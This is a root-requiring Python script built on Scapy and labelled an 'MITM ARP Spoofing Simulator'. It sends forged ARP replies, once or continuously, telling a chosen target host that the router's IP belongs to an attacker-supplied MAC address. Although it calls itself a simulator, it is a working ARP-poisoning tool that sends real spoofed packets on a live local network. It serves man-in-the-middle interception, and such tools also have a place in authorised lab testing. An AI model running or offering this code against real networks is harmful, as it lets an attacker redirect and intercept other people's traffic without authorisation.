#!/usr/bin/env python3
from scapy.all import ARP, Ether, send
import logging
import time
import argparse
import os
import re

# Check for root privileges
if os.geteuid() != 0:
    print("[-] Error: This script requires root privileges. Run with sudo.")
    exit(1)

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Logging setup
logging.basicConfig(filename="mitm_sim.log", level=logging.INFO, format="%(asctime)s - %(message)s")

# Configuration
parser = argparse.ArgumentParser(description="MITM ARP Spoofing Simulator")
parser.add_argument("--router-ip", default="192.168.1.1", help="Router IP address")
parser.add_argument("--target-ip", default="192.168.1.100", help="Target IP address")
parser.add_argument("--real-mac", default="11:22:33:44:55:66", help="Legitimate MAC address")
parser.add_argument("--fake-mac", default="aa:bb:cc:dd:ee:ff", help="Spoofed MAC address")
parser.add_argument("--delay", type=float, default=2.0, help="Delay between legitimate and spoofed ARP packets (seconds)")
parser.add_argument("--continuous", action="store_true", help="Send spoofed ARP packets continuously")
parser.add_argument("--iface", default=None, help="Network interface to use (e.g., eth0)")
args = parser.parse_args()

router_ip = args.router_ip
target_ip = args.target_ip
real_mac = args.real_mac
fake_mac = args.fake_mac
delay = args.delay
continuous = args.continuous
iface = args.iface

# Validate MAC addresses
def is_valid_mac(mac):
    return bool(re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac))

if not is_valid_mac(real_mac) or not is_valid_mac(fake_mac):
    print("[-] Error: Invalid MAC address format.")
    exit(1)

print("[*] 🦹 Simulating MITM (ARP Spoofing)...")

try:
    # Send legitimate ARP
    arp1 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=router_ip, hwsrc=real_mac, pdst=target_ip)
    send(arp1, iface=iface, verbose=0)
    print(f"[+] Legitimate ARP Sent: '{router_ip} is at {real_mac}'")
    logging.info(f"Legitimate ARP Sent: '{router_ip} is at {real_mac}'")

    time.sleep(delay)

    # Send spoofed ARP
    if continuous:
        print("[*] Sending spoofed ARP packets continuously... (Press Ctrl+C to stop)")
        try:
            while True:
                arp2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=router_ip, hwsrc=fake_mac, pdst=target_ip)
                send(arp2, iface=iface, verbose=0)
                print(f"[+] Spoofed ARP Sent: '{router_ip} is at {fake_mac}'")
                logging.info(f"Spoofed ARP Sent: '{router_ip} is at {fake_mac}'")
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopped continuous ARP spoofing.")
    else:
        arp2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=router_ip, hwsrc=fake_mac, pdst=target_ip)
        send(arp2, iface=iface, verbose=0)
        print(f"[+] Spoofed ARP Sent: '{router_ip} is at {fake_mac}'")
        logging.info(f"Spoofed ARP Sent: '{router_ip} is at {fake_mac}'")

except Exception as e:
    if "Permission denied" in str(e):
        print("[-] Error: Run this script with root privileges (sudo).")
    elif "Network is unreachable" in str(e):
        print("[-] Error: Target network is unreachable.")
    else:
        print(f"[-] Error: {e}")